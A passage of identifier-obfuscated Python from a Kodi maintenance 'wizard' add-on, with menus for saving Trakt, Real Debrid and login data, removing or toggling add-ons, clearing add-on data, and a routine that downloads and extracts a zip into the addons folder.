		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O0OO0OO000OO0 ,'',icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O0OOOO00000OOOO00 )#line:3067
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3069
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3070
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3071
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3072
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3073
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3074
	setView ('files','viewType')#line:3075
def realMenu ():#line:3077
	O0O0O0OOO0OO000O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3078
	OOO0OOOOO0O0O00OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3079
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3080
	addFile ('Save Real Debrid Data: %s'%O0O0O0OOO0OO000O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3081
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0OOOOO0O0O00OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3082
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3083
	for O0OOO00O000O0O0OO in debridit .ORDER :#line:3085
		O0000O0O0O00O0000 =DEBRIDID [O0OOO00O000O0O0OO ]['name']#line:3086
		O00O00O000OOO00OO =DEBRIDID [O0OOO00O000O0O0OO ]['path']#line:3087
		OOO0OOOOO0OOO00OO =DEBRIDID [O0OOO00O000O0O0OO ]['saved']#line:3088
		OOOOOO00OO00OOO0O =DEBRIDID [O0OOO00O000O0O0OO ]['file']#line:3089
		O0O0OO0000O0OO0O0 =wiz .getS (OOO0OOOOO0OOO00OO )#line:3090
		O0OO0OOO0O0O0OO00 =debridit .debridUser (O0OOO00O000O0O0OO )#line:3091
		OOOOOOOO000O0OOOO =DEBRIDID [O0OOO00O000O0O0OO ]['icon']if os .path .exists (O00O00O000OOO00OO )else ICONREAL #line:3092
		OOO000OO000O0OO00 =DEBRIDID [O0OOO00O000O0O0OO ]['fanart']if os .path .exists (O00O00O000OOO00OO )else FANART #line:3093
		OO0O00O0OOOO00O0O =createMenu ('saveaddon','Debrid',O0OOO00O000O0O0OO )#line:3094
		O0O00O00O00OOOOO0 =createMenu ('save','Debrid',O0OOO00O000O0O0OO )#line:3095
		OO0O00O0OOOO00O0O .append ((THEME2 %'%s Settings'%O0000O0O0O00O0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OOO00O000O0O0OO )))#line:3096
		addFile ('[+]-> %s'%O0000O0O0O00O0000 ,'',icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,themeit =THEME3 )#line:3098
		if not os .path .exists (O00O00O000OOO00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =OO0O00O0OOOO00O0O )#line:3099
		elif not O0OO0OOO0O0O0OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OOO00O000O0O0OO ,icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =OO0O00O0OOOO00O0O )#line:3100
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0OOO0O0O0OO00 ,'authdebrid',O0OOO00O000O0O0OO ,icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =OO0O00O0OOOO00O0O )#line:3101
		if O0O0OO0000O0OO0O0 =="":#line:3102
			if os .path .exists (OOOOOO00OO00OOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OOO00O000O0O0OO ,icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =O0O00O00O00OOOOO0 )#line:3103
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OOO00O000O0O0OO ,icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =O0O00O00O00OOOOO0 )#line:3104
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0OO0000O0OO0O0 ,'',icon =OOOOOOOO000O0OOOO ,fanart =OOO000OO000O0OO00 ,menu =O0O00O00O00OOOOO0 )#line:3105
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3107
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3108
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3109
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3110
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3111
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3112
	setView ('files','viewType')#line:3113
def loginMenu ():#line:3115
	OOO00OOO00O00O000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3116
	O00O0OOO00O0O0O00 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3117
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3118
	addFile ('Save Login Data: %s'%OOO00OOO00O00O000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3119
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00O0OOO00O0O0O00 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3120
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3121
	for OOO00OOO00O00O000 in loginit .ORDER :#line:3123
		O0O0O000O000O0O0O =LOGINID [OOO00OOO00O00O000 ]['name']#line:3124
		OOOO00OOO00O0O000 =LOGINID [OOO00OOO00O00O000 ]['path']#line:3125
		O0O00O0O000OO0OOO =LOGINID [OOO00OOO00O00O000 ]['saved']#line:3126
		OO000OOOO000000OO =LOGINID [OOO00OOO00O00O000 ]['file']#line:3127
		OO00O00OO000O0OOO =wiz .getS (O0O00O0O000OO0OOO )#line:3128
		O00O0O0O00OO0000O =loginit .loginUser (OOO00OOO00O00O000 )#line:3129
		OOO00O0O0O000O000 =LOGINID [OOO00OOO00O00O000 ]['icon']if os .path .exists (OOOO00OOO00O0O000 )else ICONLOGIN #line:3130
		OOO000OOOOOOOOO00 =LOGINID [OOO00OOO00O00O000 ]['fanart']if os .path .exists (OOOO00OOO00O0O000 )else FANART #line:3131
		OOOO00OO0O0O00OO0 =createMenu ('saveaddon','Login',OOO00OOO00O00O000 )#line:3132
		OOO00O000OO00O0OO =createMenu ('save','Login',OOO00OOO00O00O000 )#line:3133
		OOOO00OO0O0O00OO0 .append ((THEME2 %'%s Settings'%O0O0O000O000O0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO00OOO00O00O000 )))#line:3134
		addFile ('[+]-> %s'%O0O0O000O000O0O0O ,'',icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,themeit =THEME3 )#line:3136
		if not os .path .exists (OOOO00OOO00O0O000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOOO00OO0O0O00OO0 )#line:3137
		elif not O00O0O0O00OO0000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO00OOO00O00O000 ,icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOOO00OO0O0O00OO0 )#line:3138
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0O0O00OO0000O ,'authlogin',OOO00OOO00O00O000 ,icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOOO00OO0O0O00OO0 )#line:3139
		if OO00O00OO000O0OOO =="":#line:3140
			if os .path .exists (OO000OOOO000000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO00OOO00O00O000 ,icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOO00O000OO00O0OO )#line:3141
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO00OOO00O00O000 ,icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOO00O000OO00O0OO )#line:3142
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00O00OO000O0OOO ,'',icon =OOO00O0O0O000O000 ,fanart =OOO000OOOOOOOOO00 ,menu =OOO00O000OO00O0OO )#line:3143
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3145
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3146
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3147
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3148
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3149
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3150
	setView ('files','viewType')#line:3151
def fixUpdate ():#line:3153
	if KODIV <17 :#line:3154
		OOOO0000O0OOOO000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3155
		try :#line:3156
			os .remove (OOOO0000O0OOOO000 )#line:3157
		except Exception as O00O0O0O00OO0OO00 :#line:3158
			wiz .log ("Unable to remove %s, Purging DB"%OOOO0000O0OOOO000 )#line:3159
			wiz .purgeDb (OOOO0000O0OOOO000 )#line:3160
	else :#line:3161
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3162
def removeAddonMenu ():#line:3164
	OO00OOOO00O00O0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3165
	O000O0O00OO0OO0O0 =[];OOO00O0O00000OOOO =[]#line:3166
	for OO00O0O0O000OO0OO in sorted (OO00OOOO00O00O0OO ,key =lambda O0O0O000OO00O0O0O :O0O0O000OO00O0O0O ):#line:3167
		O00O000O0O0O000O0 =os .path .split (OO00O0O0O000OO0OO [:-1 ])[1 ]#line:3168
		if O00O000O0O0O000O0 in EXCLUDES :continue #line:3169
		elif O00O000O0O0O000O0 in DEFAULTPLUGINS :continue #line:3170
		elif O00O000O0O0O000O0 =='packages':continue #line:3171
		OOO00O0O00O00O0O0 =os .path .join (OO00O0O0O000OO0OO ,'addon.xml')#line:3172
		if os .path .exists (OOO00O0O00O00O0O0 ):#line:3173
			O00OO000000OOOOOO =open (OOO00O0O00O00O0O0 )#line:3174
			OO00OO0OOOOO0000O =O00OO000000OOOOOO .read ()#line:3175
			OO0OO00OOO0000O0O =wiz .parseDOM (OO00OO0OOOOO0000O ,'addon',ret ='id')#line:3176
			OO00OO0O00OO0OOOO =O00O000O0O0O000O0 if len (OO0OO00OOO0000O0O )==0 else OO0OO00OOO0000O0O [0 ]#line:3178
			try :#line:3179
				O0O000OO000OOOO0O =xbmcaddon .Addon (id =OO00OO0O00OO0OOOO )#line:3180
				O000O0O00OO0OO0O0 .append (O0O000OO000OOOO0O .getAddonInfo ('name'))#line:3181
				OOO00O0O00000OOOO .append (OO00OO0O00OO0OOOO )#line:3182
			except :#line:3183
				pass #line:3184
	if len (O000O0O00OO0OO0O0 )==0 :#line:3185
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3186
		return #line:3187
	if KODIV >16 :#line:3188
		OOOOO0000O0OOOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000O0O00OO0OO0O0 )#line:3189
	else :#line:3190
		OOOOO0000O0OOOO0O =[];O0O00O0000000OOOO =0 #line:3191
		OOO000OOOO0O0O00O =["-- Click here to Continue --"]+O000O0O00OO0OO0O0 #line:3192
		while not O0O00O0000000OOOO ==-1 :#line:3193
			O0O00O0000000OOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO000OOOO0O0O00O )#line:3194
			if O0O00O0000000OOOO ==-1 :break #line:3195
			elif O0O00O0000000OOOO ==0 :break #line:3196
			else :#line:3197
				O0OOOOO00O0OO0000 =(O0O00O0000000OOOO -1 )#line:3198
				if O0OOOOO00O0OO0000 in OOOOO0000O0OOOO0O :#line:3199
					OOOOO0000O0OOOO0O .remove (O0OOOOO00O0OO0000 )#line:3200
					OOO000OOOO0O0O00O [O0O00O0000000OOOO ]=O000O0O00OO0OO0O0 [O0OOOOO00O0OO0000 ]#line:3201
				else :#line:3202
					OOOOO0000O0OOOO0O .append (O0OOOOO00O0OO0000 )#line:3203
					OOO000OOOO0O0O00O [O0O00O0000000OOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O000O0O00OO0OO0O0 [O0OOOOO00O0OO0000 ])#line:3204
	if OOOOO0000O0OOOO0O ==None :return #line:3205
	if len (OOOOO0000O0OOOO0O )>0 :#line:3206
		wiz .addonUpdates ('set')#line:3207
		for OO00000000000OO0O in OOOOO0000O0OOOO0O :#line:3208
			removeAddon (OOO00O0O00000OOOO [OO00000000000OO0O ],O000O0O00OO0OO0O0 [OO00000000000OO0O ],True )#line:3209
		xbmc .sleep (1000 )#line:3211
		if INSTALLMETHOD ==1 :OOOO0O0O00OOOOO0O =1 #line:3213
		elif INSTALLMETHOD ==2 :OOOO0O0O00OOOOO0O =0 #line:3214
		else :OOOO0O0O00OOOOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3215
		if OOOO0O0O00OOOOO0O ==1 :wiz .reloadFix ('remove addon')#line:3216
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3217
def removeAddonDataMenu ():#line:3219
	if os .path .exists (ADDOND ):#line:3220
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3221
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3222
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3223
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3224
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3225
		O000OOO000O0000OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3226
		for O0O00OO0O0O0O00O0 in sorted (O000OOO000O0000OO ,key =lambda O00O000O00OOO0O0O :O00O000O00OOO0O0O ):#line:3227
			O00O00O0OOOO0OOO0 =O0O00OO0O0O0O00O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3228
			O0O0O0O00O0O0O0O0 =os .path .join (O0O00OO0O0O0O00O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3229
			OO00O0OO000O000OO =os .path .join (O0O00OO0O0O0O00O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3230
			OOOOOOOOOOOOOO0O0 =O00O00O0OOOO0OOO0 #line:3231
			OOO0OO0OOOOOOO0O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3232
			for OO0OOOO0O000O00O0 in OOO0OO0OOOOOOO0O0 :#line:3233
				OOOOOOOOOOOOOO0O0 =OOOOOOOOOOOOOO0O0 .replace (OO0OOOO0O000O00O0 ,OOO0OO0OOOOOOO0O0 [OO0OOOO0O000O00O0 ])#line:3234
			if O00O00O0OOOO0OOO0 in EXCLUDES :OOOOOOOOOOOOOO0O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOOOOOOOOOOOOO0O0 #line:3235
			else :OOOOOOOOOOOOOO0O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOOOOOOOOOOOOO0O0 #line:3236
			addFile (' %s'%OOOOOOOOOOOOOO0O0 ,'removedata',O00O00O0OOOO0OOO0 ,icon =O0O0O0O00O0O0O0O0 ,fanart =OO00O0OO000O000OO ,themeit =THEME2 )#line:3237
	else :#line:3238
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3239
	setView ('files','viewType')#line:3240
def enableAddons ():#line:3242
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3243
	OOOOO0O0O0OOO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3244
	OO0O0OOO0OOO000O0 =0 #line:3245
	for OOO0OO0O0O0OOOO0O in sorted (OOOOO0O0O0OOO000O ,key =lambda OO0000OOO00OOOO0O :OO0000OOO00OOOO0O ):#line:3246
		OO0OO0O0O0OOO0O0O =os .path .split (OOO0OO0O0O0OOOO0O [:-1 ])[1 ]#line:3247
		if OO0OO0O0O0OOO0O0O in EXCLUDES :continue #line:3248
		if OO0OO0O0O0OOO0O0O in DEFAULTPLUGINS :continue #line:3249
		O0O0OO00OOO0O0O0O =os .path .join (OOO0OO0O0O0OOOO0O ,'addon.xml')#line:3250
		if os .path .exists (O0O0OO00OOO0O0O0O ):#line:3251
			OO0O0OOO0OOO000O0 +=1 #line:3252
			OOOOO0O0O0OOO000O =OOO0OO0O0O0OOOO0O .replace (ADDONS ,'')[1 :-1 ]#line:3253
			OOO00000O0O0O0OO0 =open (O0O0OO00OOO0O0O0O )#line:3254
			O00OO000O0O0OO00O =OOO00000O0O0O0OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3255
			O0OOO000O000O000O =wiz .parseDOM (O00OO000O0O0OO00O ,'addon',ret ='id')#line:3256
			OO0O0OO00O0OOOO0O =wiz .parseDOM (O00OO000O0O0OO00O ,'addon',ret ='name')#line:3257
			try :#line:3258
				O00O0O0OO0O00000O =O0OOO000O000O000O [0 ]#line:3259
				OOO00OOOO0OOO0OO0 =OO0O0OO00O0OOOO0O [0 ]#line:3260
			except :#line:3261
				continue #line:3262
			try :#line:3263
				O0000000O00O00O00 =xbmcaddon .Addon (id =O00O0O0OO0O00000O )#line:3264
				O0OOOOOO000OOO00O ="[COLOR green][Enabled][/COLOR]"#line:3265
				OO0OO0O00000OO000 ="false"#line:3266
			except :#line:3267
				O0OOOOOO000OOO00O ="[COLOR red][Disabled][/COLOR]"#line:3268
				OO0OO0O00000OO000 ="true"#line:3269
				pass #line:3270
			OOOO0OO00O0O0000O =os .path .join (OOO0OO0O0O0OOOO0O ,'icon.png')if os .path .exists (os .path .join (OOO0OO0O0O0OOOO0O ,'icon.png'))else ICON #line:3271
			OOO0000O0OO0O0OOO =os .path .join (OOO0OO0O0O0OOOO0O ,'fanart.jpg')if os .path .exists (os .path .join (OOO0OO0O0O0OOOO0O ,'fanart.jpg'))else FANART #line:3272
			addFile ("%s %s"%(O0OOOOOO000OOO00O ,OOO00OOOO0OOO0OO0 ),'toggleaddon',OOOOO0O0O0OOO000O ,OO0OO0O00000OO000 ,icon =OOOO0OO00O0O0000O ,fanart =OOO0000O0OO0O0OOO )#line:3273
			OOO00000O0O0O0OO0 .close ()#line:3274
	if OO0O0OOO0OOO000O0 ==0 :#line:3275
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3276
	setView ('files','viewType')#line:3277
def changeFeq ():#line:3279
	OO0O000000O0OOO00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3280
	OOOOOO000O0O00O00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0O000000O0OOO00 )#line:3281
	if not OOOOOO000O0O00O00 ==-1 :#line:3282
		wiz .setS ('autocleanfeq',str (OOOOOO000O0O00O00 ))#line:3283
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0O000000O0OOO00 [OOOOOO000O0O00O00 ]))#line:3284
def developer ():#line:3286
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3287
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3288
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3289
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3290
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3291
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3292
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3293
	setView ('files','viewType')#line:3295
def download (O0OO0O00000O0O0OO ,O00OOO0OOO000O00O ):#line:3300
  O0OO0O000OOOO0OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3301
  O00O000OO0OO0OO0O =xbmcgui .DialogProgress ()#line:3302
  O00O000OO0OO0OO0O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3303
  O0OOO00OOOOOO0OOO =os .path .join (O0OO0O000OOOO0OOO ,'isr.zip')#line:3304
  O00000O000000O0OO =urllib2 .Request (O0OO0O00000O0O0OO )#line:3305
  O0OOO0000000000O0 =urllib2 .urlopen (O00000O000000O0OO )#line:3306
  O00O0OO00OO0OOO00 =xbmcgui .DialogProgress ()#line:3308
  O00O0OO00OO0OOO00 .create ("Downloading","Downloading "+name )#line:3309
  O00O0OO00OO0OOO00 .update (0 )#line:3310
  OO00O00OOO00000OO =O00OOO0OOO000O00O #line:3311
  OO00O0O00OO000O0O =open (O0OOO00OOOOOO0OOO ,'wb')#line:3312
  try :#line:3314
    O0OO0000OO00OOO0O =O0OOO0000000000O0 .info ().getheader ('Content-Length').strip ()#line:3315
    OO0OOOO0OOOOO0O0O =True #line:3316
  except AttributeError :#line:3317
        OO0OOOO0OOOOO0O0O =False #line:3318
  if OO0OOOO0OOOOO0O0O :#line:3320
        O0OO0000OO00OOO0O =int (O0OO0000OO00OOO0O )#line:3321
  OOO0O0O000OOOOOOO =0 #line:3323
  O0O00OO0O00000OOO =time .time ()#line:3324
  while True :#line:3325
        O0O00OO00OOO0000O =O0OOO0000000000O0 .read (8192 )#line:3326
        if not O0O00OO00OOO0000O :#line:3327
            sys .stdout .write ('\n')#line:3328
            break #line:3329
        OOO0O0O000OOOOOOO +=len (O0O00OO00OOO0000O )#line:3331
        OO00O0O00OO000O0O .write (O0O00OO00OOO0000O )#line:3332
        if not OO0OOOO0OOOOO0O0O :#line:3334
            O0OO0000OO00OOO0O =OOO0O0O000OOOOOOO #line:3335
        if O00O0OO00OO0OOO00 .iscanceled ():#line:3336
           O00O0OO00OO0OOO00 .close ()#line:3337
           try :#line:3338
            os .remove (O0OOO00OOOOOO0OOO )#line:3339
           except :#line:3340
            pass #line:3341
           break #line:3342
        O000OO00OO0O0O0OO =float (OOO0O0O000OOOOOOO )/O0OO0000OO00OOO0O #line:3343
        O000OO00OO0O0O0OO =round (O000OO00OO0O0O0OO *100 ,2 )#line:3344
        O0OO0000OOO0O0OOO =OOO0O0O000OOOOOOO /(1024 *1024 )#line:3345
        O00O0OOO0OO00OO0O =O0OO0000OO00OOO0O /(1024 *1024 )#line:3346
        O00O0OOOOOOOOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0000OOO0O0OOO ,'teal',O00O0OOO0OO00OO0O )#line:3347
        if (time .time ()-O0O00OO0O00000OOO )>0 :#line:3348
          O00OOO0OO000O0OOO =OOO0O0O000OOOOOOO /(time .time ()-O0O00OO0O00000OOO )#line:3349
          O00OOO0OO000O0OOO =O00OOO0OO000O0OOO /1024 #line:3350
        else :#line:3351
         O00OOO0OO000O0OOO =0 #line:3352
        O0O00O000O0OOOO0O ='KB'#line:3353
        if O00OOO0OO000O0OOO >=1024 :#line:3354
           O00OOO0OO000O0OOO =O00OOO0OO000O0OOO /1024 #line:3355
           O0O00O000O0OOOO0O ='MB'#line:3356
        if O00OOO0OO000O0OOO >0 and not O000OO00OO0O0O0OO ==100 :#line:3357
            O000OO00O0O000O00 =(O0OO0000OO00OOO0O -OOO0O0O000OOOOOOO )/O00OOO0OO000O0OOO #line:3358
        else :#line:3359
            O000OO00O0O000O00 =0 #line:3360
        OOOO0O00OO000000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOO0OO000O0OOO ,O0O00O000O0OOOO0O )#line:3361
        O00O0OO00OO0OOO00 .update (int (O000OO00OO0O0O0OO ),"Downloading "+name ,O00O0OOOOOOOOOOOO ,OOOO0O00OO000000O )#line:3363
  O0O00OO0OO0O0OO00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3366
  OO00O0O00OO000O0O .close ()#line:3368
  extract (O0OOO00OOOOOO0OOO ,O0O00OO0OO0O0OO00 ,O00O0OO00OO0OOO00 )#line:3370
  if os .path .exists (O0O00OO0OO0O0OO00 +'/scakemyer-script.quasar.burst'):#line:3371
    if os .path .exists (O0O00OO0OO0O0OO00 +'/script.quasar.burst'):#line:3372
     shutil .rmtree (O0O00OO0OO0O0OO00 +'/script.quasar.burst',ignore_errors =False )#line:3373
    os .rename (O0O00OO0OO0O0OO00 +'/scakemyer-script.quasar.burst',O0O00OO0OO0O0OO00 +'/script.quasar.burst')#line:3374
  if os .path .exists (O0O00OO0OO0O0OO00 +'/plugin.video.kmediatorrent-master'):#line:3376
    if os .path .exists (O0O00OO0OO0O0OO00 +'/plugin.video.kmediatorrent'):#line:3377
     shutil .rmtree (O0O00OO0OO0O0OO00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3378
    os .rename (O0O00OO0OO0O0OO00 +'/plugin.video.kmediatorrent-master',O0O00OO0OO0O0OO00 +'/plugin.video.kmediatorrent')#line:3379
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3380
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3381
  try :#line:3382
    os .remove (O0OOO00OOOOOO0OOO )#line:3383
  except :#line:3384
    pass #line:3385
  O00O0OO00OO0OOO00 .close ()#line:3386
def dis_or_enable_addon (OO00OO0OOO0OO0OOO ,OOO00O00O0000000O ,enable ="true"):#line:3387
    import json #line:3388
    O0OO0O0OO0OOOO0OO ='"%s"'%OO00OO0OOO0OO0OOO #line:3389
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO0OOO0OO0OOO )and enable =="true":#line:3390
        logging .warning ('already Enabled')#line:3391
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OO0OOO0OO0OOO )#line:3392
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO0OOO0OO0OOO )and enable =="false":#line:3393
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OO0OOO0OO0OOO )#line:3394
    else :#line:3395
        OOO0OOO0O0OO00000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OO0O0OO0OOOO0OO ,enable )#line:3396
        OOOOOO0O0000O0OOO =xbmc .executeJSONRPC (OOO0OOO0O0OO00000 )#line:3397
        OOO0OOOO0O0000OO0 =json .loads (OOOOOO0O0000O0OOO )#line:3398
        if enable =="true":#line:3399
            xbmc .log ("### Enabled %s, response = %s"%(OO00OO0OOO0OO0OOO ,OOO0OOOO0O0000OO0 ))#line:3400
        else :#line:3401
            xbmc .log ("### Disabled %s, response = %s"%(OO00OO0OOO0OO0OOO ,OOO0OOOO0O0000OO0 ))#line:3402
    if OOO00O00O0000000O =='auto':#line:3403
     return True #line:3404
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3405
def chunk_report (OO0O0OOO0OO0O0O0O ,OO00O0O0O00O0OO00 ,OO0O000OOO0OOOOOO ):#line:3406
   OOOO0OO0O00000O00 =float (OO0O0OOO0OO0O0O0O )/OO0O000OOO0OOOOOO #line:3407
